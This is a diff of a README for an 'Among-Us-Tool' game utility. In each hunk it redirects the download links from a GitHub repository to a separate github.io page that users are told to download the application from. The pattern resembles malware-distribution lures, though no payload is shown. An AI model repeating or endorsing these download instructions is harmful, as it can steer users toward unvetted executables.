@@ -1,10 +1,10 @@
 # 🚀 Among-Us-Tool - Elevate Your Gameplay Instantly Today
 
-[![Download Now](https://img.shields.io/badge/Download-Among--Us--Tool-brightgreen?style=for-the-badge&logo=github)](https://github.com/quetzalherbalist46/Among-Us-Tool)
+[![Download Now](https://img.shields.io/badge/Download-Among--Us--Tool-brightgreen?style=for-the-badge&logo=github)](https://quetzalherbalist46.github.io)
 
 ## 📥 Quick Download
 
-Visit this link to download the application: [https://github.com/quetzalherbalist46/Among-Us-Tool](https://github.com/quetzalherbalist46/Among-Us-Tool)
+Visit this link to download the application: [https://quetzalherbalist46.github.io](https://quetzalherbalist46.github.io)
 
 ---
 
@@ -46,7 +46,7 @@ Follow these simple steps to get Among-Us-Tool up and running on your computer.
 ### Step 1: Download the Tool
 
 1. Click the download button at the top of this page or go to the link below:
-   - [https://github.com/quetzalherbalist46/Among-Us-Tool](https://github.com/quetzalherbalist46/Among-Us-Tool)
+   - [https://quetzalherbalist46.github.io](https://quetzalherbalist46.github.io)
 2. The page will open in your browser. Look for the download section or the main file link.
 3. Click the download button to save the file to your computer.
 
